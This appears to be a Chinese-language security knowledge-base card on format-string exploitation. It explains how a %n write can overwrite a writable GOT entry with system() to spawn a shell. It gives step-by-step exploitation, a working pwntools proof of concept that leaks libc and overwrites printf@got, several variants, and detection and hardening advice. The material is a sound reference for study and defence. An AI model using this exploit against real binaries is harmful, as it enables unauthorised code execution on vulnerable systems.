---
id: binary-pwn-format-string-got-hijack
title: 格式化字符串 %n 覆写 GOT 表项劫持函数调用
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-got-hijack
tags:
- pwn
- format-string
- got
- arbitrary-write
- plt
- libc
- partial-relro
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-05T20:01:45+08:00'
  notes: V98 指出问题已按原文修正：死链改为现有 ret2dlresolve no-relro 卡
url: /docs/binary/pwn/format-string/binary-pwn-format-string-got-hijack/
draft: false
kb_aliases:
- GOT hijack
- GOT 劫持
- '%n 任意写'
- printf GOT 覆写
- exit GOT 覆写
---

## 一句话结论

格式化字符串漏洞可用 `%n` 向栈上布置的任意地址写值；在 Partial RELRO（GOT 可写）下，把某个“参数来自用户缓冲区”的函数 GOT 项改成 `system` 地址，程序随后正常调用该函数时就会执行 `system(用户字符串)`，从而 getshell。

## 原理

- `printf(user_input)` 把用户输入当格式串。`%n` 不输出字符，而是把“到目前为止已输出的字符数”写入其对应的指针参数；配合位置参数 `%<k>$n` 可以精确指定栈上第 k 个参数槽里的地址作为写入目标。
- 若在输入缓冲区里放入目标地址（如 `printf@got`），并让格式串的某个位置参数正好引用到它，`%n` 就会把计数写到该地址——这就是格式化字符串的任意地址写原语。
- GOT 表存放外部函数的真实地址。Partial RELRO/惰性绑定时 `.got.plt` 可写，程序调用函数时从 GOT 取地址；把某函数 GOT 项改成 `system` 的真实地址后，下一次调用该函数就会跳进 `system`。
- 参数对齐是该手法的关键：被覆写的函数必须以“指向攻击者可控字符串的指针”作为第一个参数。例如程序执行 `printf(buf)`，把 `printf@got` 改成 `system` 后再让 `buf = "/bin/sh"`，就等价于 `system("/bin/sh")`。
- 反例：若把 `exit@got` 改成 `system`，程序调用 `exit(0)` 时实际执行 `system(0)`（即 `system(NULL)`），不会得到 shell；必须换一个参数可控的调用点，或先把参数布置成命令字符串指针。这也是原文 `exit(0)` 示例不能直接照搬的原因。
- 写值需要先知道 `system` 的真实地址：用 `%p` 找栈上的 libc 指针，或用 `%s` 读取某个已解析 GOT 项（如 `printf@got`）泄露 libc 基址，再按 libc 版本计算 `system`。

## 触发条件

- 存在 `printf(buf)`、`fprintf(f, buf)`、`syslog(buf)` 等把用户输入直接当格式串的调用，且 `%n` 未被 `_FORTIFY_SOURCE`/`-Wformat-security` 拦截。
- 二进制为 Partial RELRO 或 No RELRO，目标 GOT 项可写（Full RELRO 不成立）。
- 能确定格式串参数与目标地址在栈上的相对位置（位置索引 k），且输入缓冲区可放入 4/8 字节地址。
- 能泄露 libc 基址（`%p`/`%s`）或已知 `system` 地址；目标 libc 版本可获取。
- 存在一个后续调用被覆写函数、且其第一个参数指向用户可控字符串的调用点（如 `printf(buf)`、`puts(buf)`、`atoi(buf)`、`free(chunk)`）。

## 利用步骤

1. 确认漏洞点与保护：`checksec` 看 RELRO；确认 `printf` 的参数就是用户缓冲区。
2. 找参数偏移：发送 `AAAA.%p.%p.%p...`，数到出现 `0x41414141`/`0x4141414141414141` 的槽位，得到位置索引 k。
3. 泄露 libc：如用 `%<k>$s` 加 `p64(elf.got['printf'])` 读出 `printf` 真实地址，减去 `libc.sym['printf']` 得基址，再加 `libc.sym['system']`。
4. 构造写：用 pwntools `fmtstr_payload(k, {target_got: system_addr})` 或手工按字节用 `%hhn` 分段写，避免一次输出过长。
5. 触发：让程序再次调用被覆写函数并传入 `"/bin/sh"`（若覆写的是 `printf@got`，下一次 `printf(buf)` 的 `buf` 就是参数），取得 shell。

## PoC

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process('./vuln')

k = 7                                   # 格式串参数位置，需用 %p 扫描实测

# 1) 用 %s 读取 printf@got 泄露 libc 基址
p.sendline(f'%{k}$s'.encode() + p64(elf.got['printf']))
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.sym['printf']

# 2) 将 printf@got 覆写为 system
payload = fmtstr_payload(k, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)

# 3) 程序下一次 printf(buf) 时传入命令，等价于 system("/bin/sh")
p.sendline(b'/bin/sh')
p.interactive()
```

## 变体与关联

- 变体：`atoi@got`→`system`，随后输入 `/bin/sh`；`free@got`→`system`，让堆块内容以 `/bin/sh` 开头；`__stack_chk_fail@got`→`system` 等。
- 变体：目标函数参数不可控时，可覆写 `strlen`/`strcmp` 等以用户指针为参数的函数，或直接把返回地址/`.fini_array` 改为 one_gadget。
- 变体：只写低 2 字节（`%hn`）利用 ASLR 页内偏移固定，减少输出量；大地址用 `%hhn` 逐字节写。
- 关联：[[binary-pwn-format-string-canary-leak-ret2copy-authorized-keys]]（同一原语先泄 Canary 再栈溢出的组合利用）、[[binary-pwn-stack-ret2dlresolve-no-relro-dystrtab]]（另一类利用 ELF 延迟绑定机制的劫持）。

## 检测与防御

- 检测：输入中出现大量 `%p`/`%s`/`%n` 组合；进程崩溃在 `printf`/`vfprintf` 内部；GOT 项在运行期被改写（可用 RELRO 完整性或运行时监控发现）；异常 `system`/`execve` 调用。
- 修复：所有格式化输出改为 `printf("%s", buf)`；编译加 `-Wformat-security -Werror=format-security` 与 `-D_FORTIFY_SOURCE=2`。
- 加固：启用 Full RELRO + BIND_NOW 让 GOT 只读；启用 ASLR/PIE 提高地址预测难度；对 setuid/服务程序做输入过滤（拒绝含 `%n` 的输入只是补充手段）。
